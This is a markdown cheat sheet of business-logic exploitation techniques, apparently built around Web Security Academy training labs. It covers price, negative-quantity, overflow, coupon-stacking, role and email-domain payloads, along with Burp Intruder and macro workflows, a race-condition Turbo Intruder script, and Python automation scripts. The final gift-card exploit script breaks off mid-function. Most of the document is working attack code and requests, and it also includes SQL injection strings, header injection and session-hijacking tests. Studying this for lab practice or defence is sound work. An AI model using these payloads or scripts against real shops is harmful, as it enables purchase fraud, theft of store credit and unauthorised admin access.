# Business Logic Vulnerabilities - Complete Cheat Sheet

> **Comprehensive exploitation reference with all payloads, techniques, and workflows**
>
> Your go-to reference for business logic vulnerability testing and exploitation

---

## Table of Contents

1. [All Exploitation Payloads](#payloads)
2. [Parameter Manipulation Techniques](#parameter-manipulation)
3. [Burp Suite Workflows](#burp-workflows)
4. [HTTP Request Examples](#http-examples)
5. [Common Bypass Techniques](#bypass-techniques)
6. [Automation Scripts](#automation-scripts)

---

## All Exploitation Payloads {#payloads}

### Price Manipulation Payloads

#### Basic Price Modification

```http
# Original request
POST /cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1&price=133700

# Payload 1: Zero-cost attack
productId=1&quantity=1&price=0

# Payload 2: Minimal cost
productId=1&quantity=1&price=1

# Payload 3: Negative price (gain credit)
productId=1&quantity=1&price=-1000

# Payload 4: Decimal manipulation
productId=1&quantity=1&price=0.01
productId=1&quantity=1&price=.01
productId=1&quantity=1&price=1.337
```

#### Advanced Price Payloads

```http
# Format variations
price=1&price=133700  (Parameter pollution)
price[]=1&price[]=133700  (Array injection)
price={"amount":1,"currency":"USD"}  (JSON injection)
price=1337.00&discount=100  (Discount manipulation)

# Type juggling
price="1"  (String)
price=true  (Boolean)
price=null  (Null)
price=undefined  (Undefined)
price=NaN  (Not a Number)

# Encoding bypasses
price=%31  (URL encoded "1")
price=0x1  (Hex)
price=1e0  (Scientific notation)
```

---

### Quantity Manipulation Payloads

#### Negative Quantity Attacks

```http
# Basic negative values
quantity=-1
quantity=-100
quantity=-999999

# Calculated negative for specific item
# Formula: -(expensive_price / cheap_price) rounded to bring total under limit
quantity=-134  # For $1337 expensive, $10 cheap

# Extreme negative values
quantity=-2147483648  # MIN_INT (32-bit)
quantity=-9223372036854775808  # MIN_LONG (64-bit)
```

#### Overflow Quantity Attacks

```http
# 32-bit integer overflow
quantity=2147483647  # MAX_INT
quantity=2147483648  # MAX_INT + 1 (overflow to negative)

# 64-bit integer overflow
quantity=9223372036854775807  # MAX_LONG
quantity=9223372036854775808  # Overflow

# Repeated additions to cause overflow
quantity=99  # Max per request
# Repeat 16,064 times for $13.37 item
# Results in integer overflow and negative total
```

#### Boundary Value Testing

```http
# Test these values for quantity:
quantity=0    # Zero
quantity=1    # Minimum valid
quantity=-1   # Just below zero
quantity=99   # Common maximum
quantity=100  # Just above common max
quantity=999  # High valid
quantity=1000 # Above high valid
quantity=999999999  # Extremely high
```

---

### Coupon/Discount Payloads

#### Single Coupon Codes

```http
POST /cart/coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Common promotional codes to test
coupon=NEWCUST5
coupon=SIGNUP30
coupon=WELCOME
coupon=SAVE10
coupon=FREESHIP
coupon=VIP20
coupon=FIRST
coupon=PROMO

# Case variation testing
coupon=newcust5
coupon=NEWCUST5
coupon=NewCust5
coupon=nEwCuSt5

# Encoding variations
coupon=NEWCUST5%20
coupon=%20NEWCUST5
coupon=NEWCUST5%00
```

#### Coupon Stacking Payloads

```http
# Parameter pollution (multiple coupons)
coupon=NEWCUST5&coupon=SIGNUP30

# Array format
coupon[]=NEWCUST5&coupon[]=SIGNUP30

# JSON format
{"coupons":["NEWCUST5","SIGNUP30"]}

# Alternating sequence (bypass consecutive check)
Request 1: coupon=NEWCUST5  ✅
Request 2: coupon=NEWCUST5  ❌ (rejected)
Request 3: coupon=SIGNUP30  ✅ (different from last)
Request 4: coupon=NEWCUST5  ✅ (different from last)
Request 5: coupon=SIGNUP30  ✅ (different from last)
# Continue alternating...
```

#### Discount Manipulation

```http
# Direct discount modification
discount=100  # 100% off
discount=999  # 999% (negative price?)
discount=-50  # Negative discount (price increase to manipulate logic)

# Percentage vs fixed amount
discount_percent=100
discount_amount=999999

# Multiple discount fields
discount1=30&discount2=20&discount3=10
```

---

### Email/Account Manipulation Payloads

#### Email Domain Bypass

```http
POST /my-account/change-email HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Basic privileged domain
email=attacker@dontwannacry.com

# Email variations
email=attacker+admin@dontwannacry.com  # Plus addressing
email=ATTACKER@DONTWANNACRY.COM  # Case variation
email=attacker@dontwannacry.com%20  # Trailing space
email=%20attacker@dontwannacry.com  # Leading space
email=attacker@dontwannacry.com%00  # Null byte

# Subdomain confusion
email=attacker@evil.dontwannacry.com
email=attacker@dontwannacry.com.attacker.com

# Unicode/IDN homograph
email=attacker@dοntwannacry.com  # Greek omicron 'ο' instead of 'o'

# Email header injection
email=attacker@dontwannacry.com%0ACc:admin@target.com

# SQL injection in email
email=admin@dontwannacry.com'OR'1'='1
email=admin@dontwannacry.com';--
```

#### Role/Privilege Manipulation

```http
# Direct role assignment
POST /my-account/update HTTP/1.1

role=admin
role=administrator
role=superuser
role=root

# Array format
roles[]=user&roles[]=admin

# JSON format
{"role":"admin"}
{"roles":["user","admin"]}

# Hidden parameter injection
username=attacker&role=admin
username=attacker&isAdmin=true
username=attacker&privilege=9999
```

---

### Workflow Bypass Payloads

#### Confirmation URL Replay

```http
# Original confirmation after legitimate purchase
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
Cookie: session=abc123

# Replay with different cart contents
# (After adding expensive item and NOT checking out)
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
Cookie: session=abc123
# Server confirms order without payment validation!

# Variations to test
GET /cart/order-confirmation?order-confirmation=1
GET /cart/order-confirmation?order-confirmation=yes
GET /cart/order-confirmation?order-confirmation=anything
GET /cart/order-confirmation?confirmed=true
GET /cart/order-confirmation  # No parameter
```

#### Step Skipping Payloads

```http
# Normal workflow
POST /step1 → POST /step2 → POST /step3 → GET /success

# Test these skips:
POST /step1 → GET /success  # Skip to end
POST /step1 → POST /step3 → GET /success  # Skip step 2
GET /success  # Skip all steps

# Parameter manipulation
POST /step2?skip_validation=true
POST /step2?validated=true
POST /step2?previous_step=completed
```

---

### State Machine Manipulation Payloads

#### Registration/Role State Bypass

```http
# Registration workflow
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&email=test@test.com&password=pass123

# After registration, before confirmation
POST /role/select HTTP/1.1
role=admin  # May work if state transition not validated

# Skip confirmation step
POST /register → POST /login (skip email confirmation)

# Change role during registration
POST /register HTTP/1.1
username=attacker&email=test@test.com&password=pass123&role=admin
```

#### Content Type Tampering

```http
# Original request
POST /api/user/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker

# Try JSON
POST /api/user/update HTTP/1.1
Content-Type: application/json

{"username":"attacker","role":"admin"}

# Try XML
POST /api/user/update HTTP/1.1
Content-Type: application/xml

<user><username>attacker</username><role>admin</role></user>
```

---

## Parameter Manipulation Techniques {#parameter-manipulation}

### HTTP Parameter Pollution (HPP)

#### Duplicate Parameters

```http
# Test how application handles duplicate parameters

# Scenario 1: Uses first value
productId=1&price=1&price=133700
Result: price=1 ✅

# Scenario 2: Uses last value
productId=1&price=133700&price=1
Result: price=1 ✅

# Scenario 3: Uses both (array)
productId=1&price=1&price=133700
Result: price=[1, 133700] (depends on backend)

# Scenario 4: Concatenates
productId=1&price=1&price=337
Result: price="1337" (string concatenation)
```

#### Array Injection

```http
# Normal parameter
quantity=1

# Array format (may bypass validation)
quantity[]=1
quantity[0]=1
quantity[1]=2  # Multiple items?

# Nested arrays
quantity[0][0]=1

# Associative arrays
quantity[id]=1
quantity[amount]=100
```

---

### Parameter Encoding Bypasses

#### URL Encoding

```http
# Normal
price=1

# URL encoded
price=%31  # '1'
price=%30  # '0'

# Double URL encoded
price=%2531  # '%31'

# Mixed encoding
price=1%30  # '10' if concatenated
```

#### Unicode Encoding

```http
# Unicode variations
price=\u0031  # '1'
price=%u0031  # '1' (IIS)

# Unicode normalization bypass
email=admin@company.com
email=аdmin@company.com  # Cyrillic 'а' (U+0430) instead of Latin 'a'
```

#### Base64 Encoding

```http
# If parameters are base64-encoded
# Original: productId=1&price=1
# Base64: cHJvZHVjdElkPTEmcHJpY2U9MQ==

# Modified: productId=1&price=133700
# Base64: cHJvZHVjdElkPTEmcHJpY2U9MTMzNzAw

# Test if validation occurs before or after decoding
```

---

### Type Juggling Attacks

#### Type Confusion

```http
# String vs Integer
quantity="1"  # String
quantity=1    # Integer

# Boolean
is_admin=true
is_admin=1
is_admin="true"

# Null/Undefined
price=null
price=undefined
price=""

# Array vs Scalar
price=1
price[]=1

# Object
price={"amount":1}
price=[object Object]
```

#### Loose Comparison Exploitation

```php
// PHP loose comparison vulnerabilities
// "0" == 0  → true
// "1" == true → true
// "admin" == 0 → true (!)

// Payloads:
role=0  // May match "admin" in loose comparison
token=0  // May match any non-numeric token
```

---

## Burp Suite Workflows {#burp-workflows}

### Workflow 1: Price Manipulation Testing

**Time: 2 minutes**

```plaintext
Step 1: Proxy Setup
Burp → Proxy → Intercept ON
Browser → Add item to cart

Step 2: Capture Request
Proxy → HTTP History → Find POST /cart
Right-click → Send to Repeater (Ctrl+R)

Step 3: Parameter Identification
Repeater → Identify price parameter
Example: productId=1&quantity=1&price=133700

Step 4: Exploitation
Change: price=133700 → price=1
Click: Send (Ctrl+Space)
Verify: Response 200 OK

Step 5: Verification
Browser → Refresh cart page
Check: Total shows $0.01
Complete: Checkout process
```

---

### Workflow 2: Negative Quantity Testing

**Time: 5 minutes**

```plaintext
Step 1: Baseline Establishment
Add expensive item to cart (quantity=1)
Note cart total: $1,337

Step 2: Request Capture
Find POST /cart for cheap item
Send to Repeater

Step 3: Calculate Negative Quantity
Formula: -(expensive_price / cheap_price) - buffer
Example: -($1337 / $10) = -134

Step 4: Exploit Execution
Repeater → Change quantity=1 to quantity=-134
Send request
Browser → Refresh cart

Step 5: Fine-Tuning
Adjust negative quantity to bring total to $0-$100
Example: quantity=-130 may result in total=$67
Proceed to checkout
```

---

### Workflow 3: Integer Overflow Exploitation

**Time: 20 minutes**

```plaintext
Step 1: Intruder Configuration
Find: POST /cart request
Send to Intruder (Ctrl+I)
Clear all payload positions (§)
Set: quantity=99 (maximum per request)

Step 2: Payload Setup
Payloads tab → Payload type: Null payloads
Payload options → Continue indefinitely
(We'll stop manually)

Step 3: Resource Pool (CRITICAL)
Resource pool tab
Maximum concurrent requests: 1
Start delay: 0ms

Step 4: Execute Attack
Click: Start attack
New window opens showing requests

Step 5: Monitor for Overflow
Browser → Keep refreshing cart
Watch total increase:
  Request 50:  $6,600
  Request 100: $13,200
  Request 160: $2,147,356,800 (approaching max)
  Request 161: -$2,147,483,648 (OVERFLOW!)

Step 6: Stop and Fine-Tune
Intruder → Stop attack when negative appears
Clear cart
Calculate precise request count needed
Re-run with fixed payload count

Step 7: Adjust to Target
Use Repeater to add specific quantities
Add cheap items to bring total positive
Final total: $0-$100
Complete checkout
```

**Configuration Summary:**
```plaintext
Intruder Settings:
├─ Attack type: Sniper (or any, positions don't matter)
├─ Positions: None (§ cleared)
├─ Payloads:
│  ├─ Type: Null payloads
│  └─ Count: Continue indefinitely
└─ Resource Pool:
   ├─ Max concurrent: 1 ⚠️ CRITICAL
   └─ Delay: 0ms
```

---

### Workflow 4: Macro Creation for Gift Card Loop

**Time: 30 minutes setup + runtime**

```plaintext
Step 1: Manual Execution (Proof of Concept)
1. Subscribe to newsletter → Get coupon SIGNUP30
2. Buy $10 gift card with coupon ($7 spent)
3. Extract gift card code from confirmation
4. Redeem gift card ($10 gained)
5. Net profit: $3 ✅

Step 2: Burp Macro Setup
Settings → Sessions → Session Handling Rules
Click: Add
Rule description: "Gift Card Loop"
Scope: Include all URLs

Step 3: Define Macro
Details tab → Add → Run a macro
Click: Add (under Macros)
Macro description: "Buy and Redeem Gift Card"

Step 4: Select Macro Requests
Select these 5 requests from HTTP history:
1. POST /cart (Add gift card)
2. POST /cart/coupon (Apply SIGNUP30)
3. POST /cart/checkout (Complete purchase)
4. GET /cart/order-confirmation (Confirmation page)
5. POST /gift-card (Redeem gift card)

Click: OK

Step 5: Configure Parameter Extraction
Select: Request 4 (order confirmation)
Click: Configure item
Add: Custom parameter location in response
  ├─ Parameter name: gift-card
  ├─ Regex: <input[^>]*id="gift-card"[^>]*value="([^"]+)"
  └─ Extract from: Response body

Step 6: Link Extracted Parameter
Select: Request 5 (redeem gift card)
Click: Configure item
Find parameter: gift-card=ABC123XYZ789
Configure: Use extracted value from Request 4
  └─ Derive from: Request 4
      Parameter: gift-card

Step 7: Test Macro
Click: Test macro
Verify: All 5 requests complete successfully
Check: Account balance increased by $3
If success: Proceed to automation

Step 8: Intruder Automation
Create simple request: GET /
Send to Intruder
Payloads:
  ├─ Type: Null payloads
  ├─ Count: 450 (for $1,350 profit)
Resource Pool:
  └─ Max concurrent: 1

Step 9: Execute Full Attack
Click: Start attack
Monitor: Account balance periodically
Stop: When balance > jacket price ($1,337)
Purchase: Expensive item

Step 10: Verification
Navigate to "My account"
Verify: Sufficient store credit
Buy: Lightweight l33t leather jacket
Lab: Solved! ✅
```

**Macro Flow:**
```plaintext
[Intruder Request]
       ↓ (triggers)
[Session Handling Rule]
       ↓ (executes)
[Macro: 5-step sequence]
  1. Add gift card to cart
  2. Apply 30% discount coupon
  3. Checkout and pay $7
  4. Extract gift card code ←─ [EXTRACTION]
  5. Redeem code for $10  ←─ [USES EXTRACTED VALUE]
       ↓ (result)
[Net profit: +$3]
```

---

### Workflow 5: Coupon Stacking Automation

**Time: 5 minutes**

```plaintext
Step 1: Collect Coupons
Homepage banner: NEWCUST5
Newsletter signup: SIGNUP30

Step 2: Manual Test
Browser: Apply NEWCUST5 → Success
Browser: Apply NEWCUST5 → Error (duplicate)
Browser: Apply SIGNUP30 → Success
Browser: Apply NEWCUST5 → Success (!)

Step 3: Burp Repeater Setup
Find: POST /cart/coupon
Send to Repeater
Create Tab 1: coupon=NEWCUST5
Duplicate tab (Ctrl+Shift+R)
Create Tab 2: coupon=SIGNUP30

Step 4: Alternating Execution
Tab 1: Send (Ctrl+Space)
Tab 2: Send (Ctrl+Space)
Tab 1: Send
Tab 2: Send
... continue alternating

Step 5: Monitor Total
Browser: Refresh cart periodically
Continue until: Total < your store credit
Checkout: Complete purchase
```

---

## HTTP Request Examples {#http-examples}

### Example 1: Client-Side Price Trust

**Vulnerable Request:**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

productId=1&redir=PRODUCT&quantity=1&price=133700
```

**Exploited Request:**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

productId=1&redir=PRODUCT&quantity=1&price=1
```

**Result:**
- Item added at $0.01 instead of $1,337.00
- Server accepts client-supplied price without validation

---

### Example 2: Negative Quantity Exploitation

**Setup Requests:**

**Request 1: Add expensive item**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded

productId=1&redir=PRODUCT&quantity=1
```
Result: Cart total = $1,337.00

**Request 2: Add cheap item with negative quantity**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded

productId=2&redir=PRODUCT&quantity=-134
```
Result: Cart total = $1,337 + ($10 × -134) = $1,337 - $1,340 = -$3.00

**Request 3: Fine-tune with positive cheap item**
```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded

productId=2&redir=PRODUCT&quantity=10
```
Result: Cart total = -$3 + ($10 × 10) = $97.00 ✅

---

### Example 3: Email Domain Bypass

**Initial Registration:**
```http
POST /register HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@exploit-0a1b2c3d.web-security-academy.net&password=pass123
```

**Email Confirmation:**
```http
GET /confirm-email?token=abc123xyz789 HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=newSessionHere
```

**Email Change (No Verification Required):**
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=confirmedUserSession
Content-Type: application/x-www-form-urlencoded

email=attacker@dontwannacry.com&csrf=token123
```

**Admin Access Granted:**
```http
GET /admin HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=confirmedUserSession

# Response: 200 OK (Admin panel accessible!)
```

---

### Example 4: Coupon Stacking Sequence

**Request 1: Apply First Coupon**
```http
POST /cart/coupon HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=user123
Content-Type: application/x-www-form-urlencoded

csrf=token1&coupon=NEWCUST5
```
Response: "Coupon applied! Total: $1,200"

**Request 2: Apply Same Coupon (Rejected)**
```http
POST /cart/coupon HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=user123
Content-Type: application/x-www-form-urlencoded

csrf=token2&coupon=NEWCUST5
```
Response: "Coupon already applied"

**Request 3: Apply Different Coupon (Accepted)**
```http
POST /cart/coupon HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=user123
Content-Type: application/x-www-form-urlencoded

csrf=token3&coupon=SIGNUP30
```
Response: "Coupon applied! Total: $1,050"

**Request 4: Re-apply First Coupon (Accepted!)**
```http
POST /cart/coupon HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=user123
Content-Type: application/x-www-form-urlencoded

csrf=token4&coupon=NEWCUST5
```
Response: "Coupon applied! Total: $900"

**Continue alternating until total is affordable...**

---

### Example 5: Workflow Bypass

**Legitimate Workflow:**

```http
# Step 1: Add item
POST /cart HTTP/1.1
productId=10&quantity=1

# Step 2: Checkout
POST /cart/checkout HTTP/1.1
csrf=token123

# Step 3: Payment (redirects to /pay)
GET /pay?session_id=abc123 HTTP/1.1

# Step 4: Payment confirmation
POST /pay/confirm HTTP/1.1
payment_token=xyz789

# Step 5: Order confirmation (automatic redirect)
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
```

**Exploited Workflow:**

```http
# Step 1: Complete legitimate purchase of cheap item (capture confirmation URL)

# Step 2: Add expensive item to cart WITHOUT checkout
POST /cart HTTP/1.1
productId=1&quantity=1  # Expensive jacket

# Step 3: Replay order confirmation (skip payment!)
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
Cookie: session=abc123

# Result: Order confirmed without payment validation!
```

---

## Common Bypass Techniques {#bypass-techniques}

### Technique 1: CSRF Token Bypass

Many business logic flaws exist alongside weak CSRF protection.

```http
# Test: Remove CSRF token entirely
POST /cart/coupon HTTP/1.1
coupon=SIGNUP30
# (no csrf parameter)

# Test: Use empty CSRF token
csrf=&coupon=SIGNUP30

# Test: Use wrong CSRF token
csrf=wrong_token&coupon=SIGNUP30

# Test: Reuse old CSRF token
csrf=old_token_from_previous_request&coupon=SIGNUP30
```

---

### Technique 2: Session Manipulation

```http
# Test: Use another user's session
Cookie: session=victim_session_token

# Test: Session fixation
Cookie: session=attacker_controlled_value

# Test: Empty session
Cookie: session=

# Test: Remove session
# (no Cookie header)

# Test: Multiple sessions
Cookie: session=session1; session=session2
```

---

### Technique 3: HTTP Method Tampering

```http
# Original: POST request
POST /cart/coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded
coupon=SIGNUP30

# Try: GET with parameters in URL
GET /cart/coupon?coupon=SIGNUP30 HTTP/1.1

# Try: PUT method
PUT /cart/coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded
coupon=SIGNUP30

# Try: OPTIONS (may reveal allowed methods)
OPTIONS /cart/coupon HTTP/1.1

# Try: HEAD (may process without response)
HEAD /cart/coupon HTTP/1.1
```

---

### Technique 4: Content-Type Confusion

```http
# Original: Form data
POST /api/cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&price=1

# Try: JSON
POST /api/cart HTTP/1.1
Content-Type: application/json

{"productId":1,"price":1,"role":"admin"}

# Try: XML
POST /api/cart HTTP/1.1
Content-Type: application/xml

<cart><productId>1</productId><price>1</price></cart>

# Try: Multipart
POST /api/cart HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="productId"

1
------Boundary
Content-Disposition: form-data; name="price"

1
------Boundary--
```

---

### Technique 5: Race Conditions

For operations that should be one-time only:

```python
# Use Burp Intruder with parallel requests

# Example: Redeem gift card multiple times
POST /gift-card HTTP/1.1
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

csrf=token&gift-card=ABCD1234

# Burp Intruder Configuration:
# - Attack type: Sniper
# - Payloads: Null payloads, count=20
# - Resource pool: Max concurrent=20 (NOT 1)
# - Start attack
#
# Result: Gift card may be redeemed multiple times
# if server doesn't use proper locking
```

**Burp Turbo Intruder Script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)

    # Send 20 simultaneous requests
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Open gate to send all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

### Technique 6: Parameter Pollution in Different Contexts

```http
# Query string pollution
GET /cart?productId=1&price=1&price=133700 HTTP/1.1

# Body parameter pollution
POST /cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&price=1&price=133700

# Mixed (query + body)
POST /cart?price=1 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&price=133700

# Cookie pollution
Cookie: price=1; price=133700

# Header pollution
X-Price: 1
X-Price: 133700
```

---

### Technique 7: JWT Manipulation

If authentication uses JWTs:

```http
# Original JWT
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoidXNlciJ9.signature

# Decoded payload:
{
  "user": "attacker",
  "role": "user"
}

# Modified payload:
{
  "user": "attacker",
  "role": "admin"
}

# Test: Change role and re-encode
# Test: Remove signature
# Test: Change algorithm to "none"
# Test: Use weak secret for HMAC
```

---

## Automation Scripts {#automation-scripts}

### Script 1: Python Price Manipulation

```python
#!/usr/bin/env python3
import requests

# Configuration
BASE_URL = "https://lab-id.web-security-academy.net"
SESSION_COOKIE = "abc123xyz789"
PRODUCT_ID = 1
MODIFIED_PRICE = 1

# Session setup
session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

# Add item with modified price
def add_to_cart_with_price(product_id, price):
    url = f"{BASE_URL}/cart"
    data = {
        "productId": product_id,
        "redir": "PRODUCT",
        "quantity": 1,
        "price": price
    }
    response = session.post(url, data=data)
    return response

# Checkout
def checkout():
    url = f"{BASE_URL}/cart/checkout"
    data = {"csrf": get_csrf_token()}
    response = session.post(url, data=data)
    return response

# Execute exploit
print("[*] Adding item with modified price...")
response = add_to_cart_with_price(PRODUCT_ID, MODIFIED_PRICE)
if response.status_code == 200:
    print("[+] Item added successfully")
    print("[*] Proceeding to checkout...")
    checkout_response = checkout()
    if "order-confirmation" in checkout_response.url:
        print("[+] Purchase complete!")
    else:
        print("[-] Checkout failed")
else:
    print("[-] Failed to add item")
```

---

### Script 2: Python Negative Quantity Calculator

```python
#!/usr/bin/env python3

def calculate_negative_quantity(expensive_price, cheap_price, target_total, store_credit):
    """
    Calculate negative quantity needed to bring cart total to affordable amount.

    Args:
        expensive_price: Price of expensive item (e.g., 1337)
        cheap_price: Price of cheap item (e.g., 10)
        target_total: Desired final total (e.g., 50)
        store_credit: Available store credit (e.g., 100)

    Returns:
        Negative quantity needed
    """
    # Calculate amount to reduce
    amount_to_reduce = expensive_price - target_total

    # Calculate negative quantity
    negative_quantity = -(amount_to_reduce / cheap_price)

    # Round to nearest integer
    negative_quantity = int(negative_quantity)

    # Verify result
    final_total = expensive_price + (cheap_price * negative_quantity)

    print(f"Expensive item: ${expensive_price}")
    print(f"Cheap item: ${cheap_price}")
    print(f"Target total: ${target_total}")
    print(f"Store credit: ${store_credit}")
    print(f"\nNegative quantity needed: {negative_quantity}")
    print(f"Resulting total: ${final_total}")

    if 0 < final_total <= store_credit:
        print(f"✅ Total is affordable!")
    else:
        print(f"❌ Adjust values - total not in range")

    return negative_quantity

# Example usage
calculate_negative_quantity(
    expensive_price=1337,
    cheap_price=10,
    target_total=67,
    store_credit=100
)
```

Output:
```
Expensive item: $1337
Cheap item: $10
Target total: $67
Store credit: $100

Negative quantity needed: -127
Resulting total: $67
✅ Total is affordable!
```

---

### Script 3: Python Coupon Stacker

```python
#!/usr/bin/env python3
import requests
import re

class CouponStacker:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set("session", session_cookie)
        self.coupons = ["NEWCUST5", "SIGNUP30"]

    def get_csrf_token(self):
        """Extract CSRF token from cart page"""
        response = self.session.get(f"{self.base_url}/cart")
        match = re.search(r'name="csrf" value="([^"]+)"', response.text)
        return match.group(1) if match else None

    def apply_coupon(self, coupon_code):
        """Apply a single coupon code"""
        url = f"{self.base_url}/cart/coupon"
        data = {
            "csrf": self.get_csrf_token(),
            "coupon": coupon_code
        }
        response = self.session.post(url, data=data)

        if "already applied" in response.text.lower():
            return False
        elif "applied" in response.text.lower():
            return True
        else:
            return None

    def get_cart_total(self):
        """Extract current cart total"""
        response = self.session.get(f"{self.base_url}/cart")
        match = re.search(r'\$([0-9,]+\.[0-9]{2})', response.text)
        if match:
            total_str = match.group(1).replace(',', '')
            return float(total_str)
        return None

    def stack_coupons(self, target_total):
        """Alternate between coupons until target total reached"""
        current_total = self.get_cart_total()
        print(f"[*] Starting total: ${current_total}")
        print(f"[*] Target total: ${target_total}")

        coupon_index = 0
        attempts = 0
        max_attempts = 100

        while current_total > target_total and attempts < max_attempts:
            coupon = self.coupons[coupon_index]
            print(f"[*] Applying coupon: {coupon}")

            result = self.apply_coupon(coupon)
            if result:
                new_total = self.get_cart_total()
                print(f"[+] Applied! New total: ${new_total}")
                current_total = new_total
                coupon_index = (coupon_index + 1) % len(self.coupons)
            elif result is False:
                print(f"[-] Coupon rejected, switching...")
                coupon_index = (coupon_index + 1) % len(self.coupons)
            else:
                print(f"[!] Unknown response, switching...")
                coupon_index = (coupon_index + 1) % len(self.coupons)

            attempts += 1

        final_total = self.get_cart_total()
        print(f"\n[*] Final total: ${final_total}")
        if final_total <= target_total:
            print("[+] Target reached! Proceed to checkout.")
        else:
            print("[-] Could not reach target total.")

# Usage
stacker = CouponStacker(
    base_url="https://lab-id.web-security-academy.net",
    session_cookie="your_session_cookie_here"
)
stacker.stack_coupons(target_total=100)
```

---

### Script 4: Bash Integer Overflow Calculator

```bash
#!/bin/bash

# Integer overflow calculator for business logic testing

ITEM_PRICE=133700  # Price in cents ($1,337.00)
MAX_INT=2147483647  # 32-bit signed integer max
MAX_QUANTITY_PER_REQUEST=99

# Calculate number of items needed to overflow
items_needed=$((MAX_INT / ITEM_PRICE + 1))
echo "[*] Item price: $ITEM_PRICE cents"
echo "[*] Max 32-bit int: $MAX_INT"
echo "[*] Items needed for overflow: $items_needed"

# Calculate number of requests needed
requests_needed=$((items_needed / MAX_QUANTITY_PER_REQUEST + 1))
echo "[*] Max quantity per request: $MAX_QUANTITY_PER_REQUEST"
echo "[*] Requests needed: $requests_needed"

# Calculate what happens
total_items=$((requests_needed * MAX_QUANTITY_PER_REQUEST))
raw_total=$((total_items * ITEM_PRICE))
echo "[*] Total items: $total_items"
echo "[*] Raw total (before overflow): $raw_total cents"

# Note: Actual overflow calculation requires programming language
# This script provides the parameters for Burp Intruder configuration

echo ""
echo "=== Burp Intruder Configuration ==="
echo "Attack type: Sniper"
echo "Payload type: Null payloads"
echo "Payload count: $requests_needed"
echo "Resource pool: Max concurrent requests = 1"
echo "Request body: quantity=$MAX_QUANTITY_PER_REQUEST"
```

---

### Script 5: Python Gift Card Loop Automation

```python
#!/usr/bin/env python3
import requests
import re
import time

class GiftCardExploit:
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.session = requests.Session()
        self.username = username
        self.password = password
        self.login()

    def login(self):
        """Login to the application"""
        url = f"{self.base_url}/login"
        data = {
            "username": self.username,
            "password": self.password
        }
        response = self.session.post(url, data=data)
        if "My account" in response.text:
            print("[+] Login successful")
        else:
            print("[-] Login failed")

    def get_csrf_token(self):
        """Extract CSRF token from page"""
        response = self.session.get(f"{self.base_url}/cart")
        match = re.search(r'name="csrf" value="([^"]+)"', response.text)
        return match.group(1) if match else None

    def add_gift_card_to_cart(self, product_id=2):
        """Add $10 gift card to cart"""
        url = f"{self.base_url}/cart"
        data = {
            "productId": product_id,
            "redir": "PRODUCT",
            "quantity": 1
        }
        response = self.session.post(url, data=data)
        return response.status_code == 200

    def apply_coupon(self, coupon="SIGNUP30"):
        """Apply discount coupon"""
        url = f"{self.base_url}/cart/coupon"
        data = {
            "csrf": self.get_csrf_token(),
            "coupon": coupon
        }
        response = self.session.post(url, data=data)
        return "applied" in response.text.lower()

    def checkout(self):
        """Complete checkout"""
        url = f"{self.base_url}/cart/checkout"
        data = {"csrf": self.get_csrf_token()}
        response = self.session.post(url, data=data)
        return response

    def extract_gift_card_code(self, html):
        """Extract gift card code from confirmation page"""
        match = re.search(r'id="gift-card"[^>]*value="([^"]+)"', html)
        return match.group(1) if match else None

    def redeem_gift_card(self, code):
        """Redeem gift card code"""
        url = f"{self.base_url}/gift-card"
        data = {
            "csrf": self.get_csrf_token(),
            "gift-card": code
        }
        response = self.session.post(url, data=data)
        return "redeemed" in response.text.lower() or response.status_code == 200

    def get_store_credit(self):
        """Get current store credit"""
        response = self.session.get(f"{self.base_url}/my-account")
